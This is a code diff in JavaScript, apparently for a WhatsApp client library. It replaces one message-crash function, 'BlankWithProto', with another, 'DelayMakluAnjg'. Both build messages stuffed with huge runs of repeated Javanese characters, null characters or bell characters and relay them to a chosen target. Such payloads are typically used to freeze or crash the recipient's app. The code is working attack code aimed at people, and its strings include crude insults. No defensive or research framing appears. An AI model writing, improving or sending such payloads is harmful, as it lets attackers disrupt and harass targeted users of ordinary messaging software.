@@ -1,37 +1,35 @@
-async function BlankWithProto(sock, target) {
-    try {
-        const message = {
-            interactiveMessage: {
-                header: {
-                    title: "ꦾ".repeat(50000),
-                    hasMediaAttachment: false
-                },
-                body: {
-                    text: "ꦽ".repeat(60000)
-                },
-                footer: {
-                    text: "@1".repeat(40000)
-                },
-                nativeFlowMessage: {
-                    buttons: [
-                        {
-                            name: "booking_confirmation",
-                            buttonParamsJson: "ꦾ".repeat(100000)
-                        }
-                    ]
-                }
+async function DelayMakluAnjg(sock, target) {
+  await sock.relayMessage(target, {
+    groupStatusMessageV2: {
+      message: {
+        interactiveResponseMessage: {
+          body: {
+            text: "YatimXxXcrotX",
+            format: "DEFAULT"
+          },
+          nativeFlowResponseMessage: {
+            name: "address_message",
+            paramsJson: {"values":{"in_pin_code":"xxx","building_name":"xxx","landmark_area":"X","address":"xxx","tower_number":"maklo","city":"porno","name":"crb","phone_number":"xxx","house_number":"xxx","floor_number":"xxx","state":"yandex | ${"\u0000".repeat(1645000)}"}},
+            version: 3
+          },
+          contextInfo: {
+            quotedMessage: {
+              viewOnceMessage: {
+                message: {
+                  interactiveResponseMessage: {
+                    body: {
+                      text: "⏤͟͟͞͞𝗞𝗶𝗺𝗶𝗫𝗫𝟳 ⩇⩇:⩇⩇" + "ꦾ".repeat(50000) + "ꦽ".repeat(50000),
+                      format: "DEFAULT" 
+                    },
+                    nativeFlowResponseMessage: {
+                      name: "call_permission_request",
+                      paramsJson: "\u0007".repeat(90000),
+                      version: 3
+              }
             }
-        };
-        
-        const protoMessage = proto.Message.fromObject(message);
-        
-        await sock.relayMessage(target, protoMessage, {
-            messageId: null,
-            participant: { jid: target }
-        });
-
-        console.log(`[SUCCESS] Invisible buttons-first sent to ${target}`);
-    } catch (err) {
-        console.log("Error:", err);
+          }
+        }
+      }
     }
+  }, { participant: { jid: target }});
 }
